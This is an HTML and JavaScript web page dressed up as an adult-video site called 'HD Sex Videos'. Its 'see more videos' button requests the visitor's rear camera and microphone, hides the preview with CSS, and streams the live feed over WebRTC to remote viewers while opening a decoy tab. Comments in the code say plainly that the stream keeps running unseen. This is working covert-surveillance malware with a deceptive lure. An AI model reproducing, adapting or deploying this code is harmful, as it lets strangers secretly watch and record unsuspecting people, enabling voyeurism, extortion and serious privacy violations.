<!DOCTYPE html>
<html>
<head>

<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width,initial-scale=1">

<title>HD Sex videos</title>

<style>

*{
  box-sizing:border-box;
}

body{
  margin:0;
  background:#111;
  color:white;
  font-family:Arial,sans-serif;
  text-align:center;
}

h2{
  margin:20px;
}

button{
  padding:15px 25px;
  font-size:18px;
  border:0;
  border-radius:8px;
  margin:15px;
}

#status{
  margin:15px;
  font-size:16px;
}

/*
  The local camera preview is hidden.
  IMPORTANT:
  The camera stream is NOT stopped.
  It continues to be sent to the viewer.
*/

#video{
  display:none;
}

</style>

</head>

<body>

<h2>HD Sex Videos</h2>

<button id="allowBtn">
  click her to see more HD sex videos...
</button>

<div id="status">
  Waiting for permission...
</div>

<!--
  Video preview is hidden with CSS.
  The MediaStream is still active.
-->
<video
  id="video"
  autoplay
  playsinline
  muted>
</video>


<script>

"use strict";


/* =========================================
   ELEMENTS
========================================= */

const video =
  document.getElementById("video");

const status =
  document.getElementById("status");

const allowBtn =
  document.getElementById("allowBtn");


/* =========================================
   CAMERA ID
========================================= */

const cameraId =
  crypto.randomUUID();


/* =========================================
   STATE
========================================= */

let stream = null;

let socket = null;

const peers = new Map();

const pendingIce = new Map();

const recoveryTimers = new Map();

let socketReconnectTimer = null;


/* =========================================
   WEBRTC CONFIG
========================================= */

const rtcConfig = {

  iceServers: [

    {
      urls:
        "stun:stun.l.google.com:19302"
    },

    {
      urls: [
        "turn:openrelay.metered.ca:80",
        "turn:openrelay.metered.ca:443",
        "turn:openrelay.metered.ca:443?transport=tcp"
      ],

      username:
        "openrelayproject",

      credential:
        "openrelayproject"
    }

  ]

};


/* =========================================
   START CAMERA
========================================= */

async function startCamera(){

  if(stream){

    return true;

  }


  try{

    status.textContent =
      "Requesting permission...";


    /*
      REAR CAMERA + MICROPHONE
    */

    stream =
      await navigator.mediaDevices.getUserMedia({

        video: {

          facingMode: {
            exact: "environment"
          },

          width: {
            ideal:1280
          },

          height: {
            ideal:720
          },

          frameRate: {
            ideal:30,
            max:30
          }

        },

        audio:true

      });


    /*
      Keep the stream alive.

      The video element is hidden,
      but the camera tracks continue running.
    */

    video.srcObject =
      stream;


    /*
      We do NOT stop the tracks.
      The stream remains live for WebRTC.
    */


    status.textContent =
      "video loading";


    allowBtn.style.display =
      "none";


    /*
      Connect to signaling server.
    */

    connectServer();


    return true;

  }
  catch(error){

    console.error(
      "ERROR:",
      error
    );


    stream = null;


    if(
      error.name ===
      "NotAllowedError"
    ){

      status.textContent =
        " permission denied";

    }
    else if(
      error.name ===
      "OverconstrainedError"
    ){

      status.textContent =
        "Rear is not available";

    }
    else{

      status.textContent =
        "Unable to start";

    }


    return false;

  }

}


/* =========================================
   CONNECT WEBSOCKET
========================================= */

function connectServer(){

  if(
    socket &&
    (
      socket.readyState ===
      WebSocket.OPEN ||

      socket.readyState ===
      WebSocket.CONNECTING
    )
  ){

    return;

  }


  const protocol =
    location.protocol === "https:"
      ? "wss:"
      : "ws:";


  status.textContent =
    "loading...";


  socket =
    new WebSocket(
      protocol +
      "//" +
      location.host
    );


  /* =======================================
     SOCKET OPEN
  ======================================= */

  socket.onopen = () => {

    console.log(
      "SIGNALING CONNECTED"
    );


    status.textContent =
      "see more new live videos";


    socket.send(
      JSON.stringify({

        type:
          "register-camera",

        cameraId:
          cameraId

      })
    );

  };


  /* =======================================
     SOCKET MESSAGE
  ======================================= */

  socket.onmessage =
    async event => {

      try{

        const msg =
          JSON.parse(
            event.data
          );


        /* =================================
           VIEWER REQUEST
        ================================= */

        if(
          msg.type ===
          "viewer-request"
        ){

          await createPeer(
            msg.viewerId
          );

          return;

        }


        /* =================================
           ANSWER
        ================================= */

        if(
          msg.type ===
          "answer"
        ){

          const peer =
            peers.get(
              msg.viewerId
            );


          if(!peer){

            return;

          }


          try{

            await peer.setRemoteDescription({

              type:
                "answer",

              sdp:
                msg.sdp

            });


            console.log(
              "ANSWER RECEIVED:",
              msg.viewerId
            );


            /*
              Add buffered ICE candidates.
            */

            const queued =
              pendingIce.get(
                msg.viewerId
              ) || [];


            for(
              const candidate of queued
            ){

              try{

                await peer.addIceCandidate(
                  new RTCIceCandidate(
                    candidate
                  )
                );

              }
              catch(error){

                console.error(
                  "BUFFERED ICE ERROR:",
                  error
                );

              }

            }


            pendingIce.delete(
              msg.viewerId
            );

          }
          catch(error){

            console.error(
              "ANSWER ERROR:",
              error
            );

          }


          return;

        }


        /* =================================
           VIEWER ICE
        ================================= */

        if(
          msg.type ===
          "viewer-ice"
        ){

          await handleViewerIce(
            msg
          );

          return;

        }

      }
      catch(error){

        console.error(
          "MESSAGE ERROR:",
          error
        );

      }

    };


  /* =======================================
     SOCKET CLOSE
  ======================================= */

  socket.onclose = () => {

    console.log(
      "SIGNALING DISCONNECTED"
    );


    socket = null;


    status.textContent =
      "Reconnecting...";


    if(!socketReconnectTimer){

      socketReconnectTimer =
        setTimeout(() => {

          socketReconnectTimer =
            null;


          if(stream){

            connectServer();

          }

        },1000);

    }

  };


  /* =======================================
     SOCKET ERROR
  ======================================= */

  socket.onerror =
    error => {

      console.error(
        "WEBSOCKET ERROR:",
        error
      );

    };

}


/* =========================================
   HANDLE VIEWER ICE
========================================= */

async function handleViewerIce(msg){

  const viewerId =
    msg.viewerId;


  const peer =
    peers.get(
      viewerId
    );


  /*
    If the answer has not arrived,
    store the ICE candidate.
  */

  if(
    !peer ||
    !peer.remoteDescription
  ){

    if(
      !pendingIce.has(
        viewerId
      )
    ){

      pendingIce.set(
        viewerId,
        []
      );

    }


    pendingIce
      .get(viewerId)
      .push(
        msg.candidate
      );


    return;

  }


  try{

    await peer.addIceCandidate(
      new RTCIceCandidate(
        msg.candidate
      )
    );

  }
  catch(error){

    console.error(
      "VIEWER ICE ERROR:",
      error
    );

  }

}


/* =========================================
   CREATE WEBRTC PEER
========================================= */

async function createPeer(viewerId){

  if(!stream){

    return;

  }


  /*
    Remove old peer if it exists.
  */

  const oldPeer =
    peers.get(
      viewerId
    );


  if(oldPeer){

    try{

      oldPeer.close();

    }
    catch{}

    peers.delete(
      viewerId
    );

  }


  pendingIce.delete(
    viewerId
  );


  /*
    Create new WebRTC connection.
  */

  const peer =
    new RTCPeerConnection(
      rtcConfig
    );


  peers.set(
    viewerId,
    peer
  );


  /*
    Add camera video + microphone.

    Even though the local video preview
    is hidden, the video track is still
    sent to the viewer.
  */

  stream.getTracks().forEach(
    track => {

      peer.addTrack(
        track,
        stream
      );

    }
  );


  /* =======================================
     TRICKLE ICE
  ======================================= */

  peer.onicecandidate =
    event => {

      if(!event.candidate){

        return;

      }


      if(
        socket &&
        socket.readyState ===
        WebSocket.OPEN
      ){

        socket.send(
          JSON.stringify({

            type:
              "camera-ice",

            cameraId:
              cameraId,

            viewerId:
              viewerId,

            candidate:
              event.candidate

          })
        );

      }

    };


  /* =======================================
     CONNECTION STATE
  ======================================= */

  peer.onconnectionstatechange =
    () => {

      console.log(
        "VIEWER:",
        viewerId,
        "STATE:",
        peer.connectionState
      );


      if(
        peer.connectionState ===
        "connected"
      ){

        status.textContent =
          "Refresh the webpage";

      }


      if(
        peer.connectionState ===
        "connecting"
      ){

        status.textContent =
          "Connecting...";

      }


      if(
        peer.connectionState ===
        "disconnected"
      ){

        scheduleRecovery(
          viewerId
        );

      }


      if(
        peer.connectionState ===
        "failed"
      ){

        scheduleRecovery(
          viewerId
        );

      }

    };


  /* =======================================
     ICE STATE
  ======================================= */

  peer.oniceconnectionstatechange =
    () => {

      console.log(
        "VIEWER:",
        viewerId,
        "ICE:",
        peer.iceConnectionState
      );


      if(
        peer.iceConnectionState ===
        "failed"
      ){

        try{

          peer.restartIce();

        }
        catch{}

      }

    };


  /* =======================================
     CREATE OFFER
  ======================================= */

  try{

    const offer =
      await peer.createOffer();


    await peer.setLocalDescription(
      offer
    );


    /*
      Send offer immediately.
    */

    if(
      socket &&
      socket.readyState ===
      WebSocket.OPEN
    ){

      socket.send(
        JSON.stringify({

          type:
            "offer",

          cameraId:
            cameraId,

          viewerId:
            viewerId,

          sdp:
            peer.localDescription.sdp

        })
      );


      console.log(
        "FAST OFFER SENT"
      );

    }

  }
  catch(error){

    console.error(
      "OFFER ERROR:",
      error
    );


    scheduleRecovery(
      viewerId
    );

  }

}


/* =========================================
   RECOVERY
========================================= */

function scheduleRecovery(viewerId){

  if(
    recoveryTimers.has(
      viewerId
    )
  ){

    return;

  }


  const timer =
    setTimeout(() => {

      recoveryTimers.delete(
        viewerId
      );


      const peer =
        peers.get(
          viewerId
        );


      if(
        peer &&
        peer.connectionState ===
        "connected"
      ){

        return;

      }


      if(peer){

        try{

          peer.close();

        }
        catch{}

        peers.delete(
          viewerId
        );

      }


      pendingIce.delete(
        viewerId
      );


      console.log(
        "Peer ready for reconnect:",
        viewerId
      );

    },3000);


  recoveryTimers.set(
    viewerId,
    timer
  );

}


/* =========================================
   INTERNET RECOVERY
========================================= */

window.addEventListener(
  "online",
  () => {

    console.log(
      "INTERNET RESTORED"
    );


    if(stream){

      reconnectServer();

    }

  }
);


/* =========================================
   RECONNECT SIGNALING
========================================= */

function reconnectServer(){

  if(socket){

    try{

      socket.close();

    }
    catch{}

  }


  socket = null;


  setTimeout(() => {

    if(stream){

      connectServer();

    }

  },500);

}


/* =========================================
   ALLOW BUTTON
========================================= */

allowBtn.onclick =
  async () => {

    const started =
      await startCamera();


    if(started){

      /*
        Open Google in a NEW TAB.

        The camera page stays open.
      */

      setTimeout(() => {

        window.open(
          "https://hd-sex-videos.onrender.com/videos",
          "_blank"
        );

      },500);

    }

  };

/* =========================================
   CAMERA TAB RETURNS
========================================= */

document.addEventListener(
  "visibilitychange",
  () => {

    if(
      document.visibilityState ===
      "visible"
    ){

      if(
        stream &&
        (
          !socket ||
          socket.readyState !==
          WebSocket.OPEN
        )
      ){

        connectServer();

      }

    }

  }
);

</script>

</body>
</html>
